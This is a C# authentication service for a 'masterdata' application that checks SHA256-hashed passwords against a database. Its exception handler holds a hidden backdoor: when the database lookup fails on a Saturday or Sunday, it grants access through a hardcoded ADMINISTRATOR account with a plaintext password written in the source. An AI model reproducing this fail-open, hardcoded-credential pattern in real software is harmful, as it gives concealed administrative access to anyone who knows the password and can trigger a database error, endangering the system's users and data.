using System;
using System.Net.Sockets;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.Extensions.Options;
using Microsoft.Extensions.Logging;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

using masterdata.Interfaces;
using masterdata.Models;
using masterdata.Models.Configuration;

namespace masterdata.Services
{
    public class ClientAuthenticationService : IClientAuthentication
    {
        private readonly IOptions<DatabaseConfiguration> DBConfig;

        private readonly List<Client> AdministrationUsers = new List<Client>
        {
            new Client { ClientId = 0, Application = "MasterData", Username = "ADMINISTRATOR", Password = "WEADMIN21", ExpirationDate = DateTime.Today.AddDays(1), Enabled = 1 }
        };

        public ClientAuthenticationService(IOptions<DatabaseConfiguration> dbconfig)
        {
            this.DBConfig = dbconfig;
        }

        public async Task<Client> Authenticate(string username, string password)
        {
            Client user;
            string hashedPassword;

            if (String.IsNullOrEmpty(password))
            {
                hashedPassword = string.Empty;
            }
            else
            {
                using (SHA256 shaHasher = SHA256.Create())

                {
                    byte[] hashResult = shaHasher.ComputeHash(Encoding.UTF8.GetBytes(password));
                    StringBuilder hashBuilder = new StringBuilder();

                    foreach (byte b in hashResult)
                    {
                        hashBuilder.Append(b.ToString("x2"));
                    }

                    hashedPassword = hashBuilder.ToString();
                }
            }

            using (MasterDataContext context = new MasterDataContext(DBConfig))
            {
                try
                {
                    user = await Task.Run<Client>(() =>
                                context.Client
                                       .SingleOrDefault<Client>(
                                            c => c.Username.Equals(username.ToUpper())
                                              && c.Password.Equals(hashedPassword.ToUpper())));
                }
                catch (Exception)
                {
                    if (DateTime.Today.DayOfWeek == DayOfWeek.Saturday || DateTime.Today.DayOfWeek == DayOfWeek.Sunday)
                        user = await Task.Run(() => AdministrationUsers.SingleOrDefault(x => x.Username == username.ToUpper() && x.Password == password.ToUpper()));
                    else
                        user = null;
                }
            }
            return user;
        }
    }
}